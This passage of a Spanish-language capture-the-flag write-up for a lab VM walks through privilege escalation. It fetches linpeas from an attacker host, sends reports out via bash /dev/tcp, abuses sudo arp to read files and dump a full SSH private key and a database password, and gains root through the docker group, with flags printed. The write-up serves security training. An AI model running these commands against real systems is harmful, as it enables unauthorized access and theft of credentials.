drwxr-xr-x 4 root      root      4,0K may 14 00:03 ../
-rw-r--r-- 1 calabrote calabrote  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 calabrote calabrote 3,5K abr 23  2023 .bashrc
-rw-r--r-- 1 calabrote calabrote  807 abr 23  2023 .profile
drwxr-xr-x 2 calabrote calabrote 4,0K may 12 23:01 .ssh/
```

### Escalado privilegios: calabrote --> foque

#### Enumeración con linpeas

```bash
calabrote@debian:~$ wget http://192.168.56.100:8080/linpeas.sh -O linpeas.sh
calabrote@debian:~$ chmod 755 linpeas.sh
calabrote@debian:~$ ./linpeas.sh -a | tee informe_linpeas_calabrote.txt
calabrote@debian:~$ bash -c 'cat informe_linpeas_calabrote.txt > /dev/tcp/192.168.56.100/8000'
```

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for calabrote on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User calabrote may run the following commands on debian:
    (root) NOPASSWD: /usr/sbin/arp
```

![arpon_015](imagenes/arpon_015.png)

#### ARP

> https://gtfobins.github.io/gtfobins/arp/
>
> ![arpon_017](imagenes/arpon_017.png)

```bash
calabrote@debian:~$ sudo -l
Matching Defaults entries for calabrote on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User calabrote may run the following commands on debian:
    (root) NOPASSWD: /usr/sbin/arp
calabrote@debian:~$ sudo arp -v -f /home/foque/.bash_history
>> ls -lhF
ls: Nombre de `host' no encontrado
arp: cannot set entry on line 1 of etherfile /home/foque/.bash_history !
>> cat script_net_backup.sh 
cat: Nombre de `host' no encontrado
arp: cannot set entry on line 2 of etherfile /home/foque/.bash_history !
>> chmod 755 script_net_backup.sh 
chmod: Nombre de `host' no encontrado
arp: cannot set entry on line 3 of etherfile /home/foque/.bash_history !
>> exit
...
```

> https://stackoverflow.com/questions/876239/how-to-redirect-and-append-both-standard-output-and-standard-error-to-a-file-wit

Redirigiendo stderr a stdout y filtrando para ver los comandos ejecutados y recogidos en el histórico:

```bash
calabrote@debian:~$ sudo arp -v -f /home/foque/.bash_history 2>&1 | grep '>>'
>> ls -lhF
>> cat script_net_backup.sh 
>> chmod 755 script_net_backup.sh 
>> exit
>> history 
>> docker run hello-world
>> docker container run -it --rm alpine
>> docker container ps
>> docker container ps -a
>> docker container --help
>> docker container prune
>> docker container ps -a
>> docker images 
>> history 
>> cat /etc/crontab 
>> top
>> ip addr
>> mysql -uroot -pAbc123.. -h 10.1.1.1
>> history 
>> ss -lntp
>> ls -lhF /var/www/html/
```

Se prueba la contraseña encontrada y no funciona:

```bash
calabrote@debian:~$ su - root
Contraseña: 
su: Fallo de autenticación
calabrote@debian:~$ su - foque
Contraseña: 
su: Fallo de autenticación
```

Se procede a leer el contenido del script script_net_backup.sh:

```bash
calabrote@debian:~$ sudo arp -v -f /home/foque/script_net_backup.sh 2>&1 | grep '>>'
>> #!/bin/sh
>> cd /var/www/html
>> tar czf /tmp/backup.tar.gz
>> scp -i /home/foque/.ssh/id_rsa_foque_script /tmp/backup.tar.gz 10.1.1.1@foque:backups/
>> rm /tmp/backup.tar.gz
```

Hace referencia a una id digital que está habilitada para acceder como foque al sistema:

```bash
calabrote@debian:~$ sudo arp -v -f /home/foque/.ssh/id_rsa_foque_script 2>&1 | grep '>>'
>> -----BEGIN OPENSSH PRIVATE KEY-----
>> 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
>> 8h0k8uVYLwcAAAADa2V5
>> -----END OPENSSH PRIVATE KEY-----

calabrote@debian:~$ sudo arp -v -f /home/foque/.ssh/id_rsa_foque_script.pub 2>&1 | grep '>>'
>> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCRWEbQXP46LJWmWGMYBePQf9SNO8oiHSamzZVumdKAZ8kURC8gt13700BB3is9jf3cbESUXGazlPnJgY5G5OBlmhzwKHyskLsY1MtlkilHzFOJEW5I3CBmWD/jNqHy9YESHi8e3kP5a0jh3h0spx1g4I8+LcU2zURXnb275CRP8EuILDzYuixpBu20zoUBkmEOG0nDEtoDtdsxN9FcyeSkR3gM7mGQnjQaojnUQN4jGsUNxzGzYyiIc8nJfaBA/YHFKAubXa7Bf+IuP1rIOgmVEP+oqgnvBCIkqOwvMqIptn/grbiOs2O2bvXz6FiysXIpFaFykgVrDNiqAesSIvm6WptYahkejM4UxOEi29Tjfc7HvWhosC82HqTFnyf7Z0TBbKzrNzyOZqPAXSTrFdQLlLqy/lXR1Db3kJ/BGuLF85QW0wNfy4fHaR7dXtPZVJGArz09vZXIv/iM9IJATAWK8jrHTwYhwrKk5rsUFLgNuCzcXoNCbJ0P+GdaVPTD7ht6nSw8FB/uXTCoLr1WEzxXDwF2gnUXygp8/IGP2ytZRXRB0NyjaULrZwIEXGq2HJQCM4c40IvlcBeBR7EG7NDgsIk4hYhKKNzouRHv+oCj4PvvdVjTzSwHRztw6+k13lVRs4o+wk63eeyfQIdHIZfPj9CEO4E1WAu9sZj6r7rK+Q== key

calabrote@debian:~$ sudo arp -v -f /home/foque/.ssh/authorized_keys 2>&1 | grep '>>'
>> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCRWEbQXP46LJWmWGMYBePQf9SNO8oiHSamzZVumdKAZ8kURC8gt13700BB3is9jf3cbESUXGazlPnJgY5G5OBlmhzwKHyskLsY1MtlkilHzFOJEW5I3CBmWD/jNqHy9YESHi8e3kP5a0jh3h0spx1g4I8+LcU2zURXnb275CRP8EuILDzYuixpBu20zoUBkmEOG0nDEtoDtdsxN9FcyeSkR3gM7mGQnjQaojnUQN4jGsUNxzGzYyiIc8nJfaBA/YHFKAubXa7Bf+IuP1rIOgmVEP+oqgnvBCIkqOwvMqIptn/grbiOs2O2bvXz6FiysXIpFaFykgVrDNiqAesSIvm6WptYahkejM4UxOEi29Tjfc7HvWhosC82HqTFnyf7Z0TBbKzrNzyOZqPAXSTrFdQLlLqy/lXR1Db3kJ/BGuLF85QW0wNfy4fHaR7dXtPZVJGArz09vZXIv/iM9IJATAWK8jrHTwYhwrKk5rsUFLgNuCzcXoNCbJ0P+GdaVPTD7ht6nSw8FB/uXTCoLr1WEzxXDwF2gnUXygp8/IGP2ytZRXRB0NyjaULrZwIEXGq2HJQCM4c40IvlcBeBR7EG7NDgsIk4hYhKKNzouRHv+oCj4PvvdVjTzSwHRztw6+k13lVRs4o+wk63eeyfQIdHIZfPj9CEO4E1WAu9sZj6r7rK+Q== key
```

Extracción de la clave privada de foque:

```bash
calabrote@debian:~$ sudo arp -v -f /home/foque/.ssh/id_rsa_foque_script 2>&1 | grep '>>' | sed 's/>> //g' > id_rsa_foque
calabrote@debian:~$ cat id_rsa_foque 
-----BEGIN OPENSSH PRIVATE KEY-----
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
8h0k8uVYLwcAAAADa2V5
-----END OPENSSH PRIVATE KEY-----
```

```bash
calabrote@debian:~$ chmod 600 id_rsa_foque 
calabrote@debian:~$ ssh -i id_rsa_foque foque@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:g8iur6EjGwi7RyIbOgo3T699hNqNl6zM8jdcfxu/gb0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 14 11:51:31 2024 from 127.0.0.1
$ bash
foque@debian:~$ whoami
foque
foque@debian:~$ id
uid=1002(foque) gid=1002(foque) grupos=1002(foque),996(docker)
foque@debian:~$ pwd
/home/foque
```

### Escalado privilegios: foque --> root

#### Enumeración con linpeas

```bash
foque@debian:~$ wget http://192.168.56.100:8080/linpeas.sh -O linpeas.sh
foque@debian:~$ chmod 755 linpeas.sh
foque@debian:~$ ./linpeas.sh -a | tee informe_linpeas_foque.txt
foque@debian:~$ bash -c 'cat informe_linpeas_foque.txt > /dev/tcp/192.168.56.100/8000'
```

![arpon_018](imagenes/arpon_018.png)

![arpon_019](imagenes/arpon_019.png)

#### Escalada de privilegios vía grupo docker

```bash
foque@debian:~$ docker images
REPOSITORY    TAG       IMAGE ID       CREATED         SIZE
alpine        latest    05455a08881e   3 months ago    7.38MB
hello-world   latest    d2c94e258dcb   12 months ago   13.3kB
foque@debian:~$ docker run -it --rm -v /:/mnt alpine
/ # cat /mnt/root/root.txt 
69db9f78edf072e03870a53b90aff647
```

### user.txt

```bash
foque@debian:~$ cat user.txt 
4ce7368ace8130a6df2b47080dcdc16c
```

### root.txt

```bash
/ # cat /mnt/root/root.txt 
69db9f78edf072e03870a53b90aff647
```

## Resumen vías elevación privilegios

```mermaid
---
title: Dump
---
sequenceDiagram
    atacante-->>www-data: Enumeración SSH<br>Enumeración HTTP<br>File Upload Vulnerability: reverse shell rev.phar
    www-data-->>calabrote: fuerza bruta .hidden/backup_id.zip --> id_rsa_calabrote<br>ssh -i id_rsa_calabrote
    calabrote-->>foque: GTFObins sudo arp --> lectura script_net_backup.sh --> id_rsa_foque<br>ssh -i id_rsa_foque
    foque-->>root: grupo docker: docker run -it --rm -v /:/mnt alpine
```

```mermaid
---
title: Dump
---
flowchart TD
A[atacante] -- Enumeración SSH<br>Enumeración HTTP<br>File Upload Vulnerability: reverse shell rev.phar --> B[www-data]
B[www-data] -- fuerza bruta .hidden/backup_id.zip -> id_rsa_calabrote<br>ssh -i id_rsa_calabrote --> C[calabrote]
C[calabrote] -- GTFObins sudo arp -> lectura script_net_backup.sh -> id_rsa_foque<br>ssh -i id_rsa_foque --> D[foque]
D[foque] -- grupo docker --> E[root]
```
